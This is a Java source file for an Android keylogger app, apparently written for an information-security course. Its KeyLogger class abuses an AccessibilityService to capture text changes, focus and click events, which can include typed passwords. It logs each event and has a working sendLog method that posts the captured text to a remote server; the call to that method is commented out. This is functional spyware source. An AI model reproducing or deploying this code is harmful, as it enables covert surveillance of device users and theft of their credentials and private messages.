package com.maemresen.infsec.keylogapp;

import android.accessibilityservice.AccessibilityService;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.android.volley.AuthFailureError;
import com.android.volley.RequestQueue;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import com.maemresen.infsec.keylogapp.model.KeyLog;
import com.maemresen.infsec.keylogapp.util.DateTimeHelper;

import com.maemresen.infsec.keylogapp.util.Helper;
import org.json.JSONObject;

import java.util.Date;
import java.util.LinkedHashMap;
import java.util.Map;

/**
 * @author Emre Sen, 14.05.2019
 * @contact maemresen07@gmail.com
 */
public class KeyLogger extends AccessibilityService {

    private final static String LOG_TAG = Helper.getLogTag(KeyLogger.class);
    @Override
    public void onServiceConnected() {
        Log.i(LOG_TAG, "Starting service");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {

        String uuid = Helper.getUuid();
        Date now = DateTimeHelper.getCurrentDay();
        String accessibilityEvent = null;
        String msg = null;

        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                accessibilityEvent = "TYPE_VIEW_TEXT_CHANGED";
                msg = String.valueOf(event.getText());
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
                accessibilityEvent = "TYPE_VIEW_FOCUSED";
                msg = String.valueOf(event.getText());
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_CLICKED: {
                accessibilityEvent = "TYPE_VIEW_CLICKED";
                msg = String.valueOf(event.getText());
                break;
            }
            default:
        }

        if (accessibilityEvent == null) {
            return;
        }

        Log.i(LOG_TAG, msg);

        KeyLog keyLog = new KeyLog();
        keyLog.setUuid(uuid);
        keyLog.setKeyLogDate(now);
        keyLog.setAccessibilityEvent(accessibilityEvent);
        keyLog.setMsg(msg);


        Log.e(LOG_TAG, keyLog.toString());

//        sendLog("http://192.168.1.29:8080/keylog/save", keyLog);
    }

    private Map<String, String> getMap(KeyLog keyLog) throws IllegalAccessException {
        Map<String, String> result = new LinkedHashMap<>();
        result.put("uuid", keyLog.getUuid());
        result.put("keyLogDate", DateTimeHelper.getTheDateInString(keyLog.getKeyLogDate()));
        result.put("accessibilityEvent", keyLog.getAccessibilityEvent());
        result.put("msg", keyLog.getMsg());
        return result;
    }


    private void sendLog(String uploadUrl, KeyLog keyLog) {

        try {
            RequestQueue requestQueue = Volley.newRequestQueue(this);
            JsonObjectRequest keyLogRequest = new JsonObjectRequest(uploadUrl
                    , new JSONObject(getMap(keyLog))
                    , this::onResponse
                    , this::onErrorResponse
            );
            Log.i(LOG_TAG, String.valueOf(keyLogRequest.getHeaders()));
            Log.i(LOG_TAG, new String(keyLogRequest.getBody()));
            requestQueue.add(keyLogRequest);
        } catch (AuthFailureError | IllegalAccessException authFailureError) {
            authFailureError.printStackTrace();
        }
    }

    private void onResponse(JSONObject response) {
        Log.i(LOG_TAG, "Response is : " + response);
    }

    private void onErrorResponse(VolleyError error) {
        Log.e(LOG_TAG, error.getMessage());
    }

    @Override
    public void onInterrupt() {

    }
}
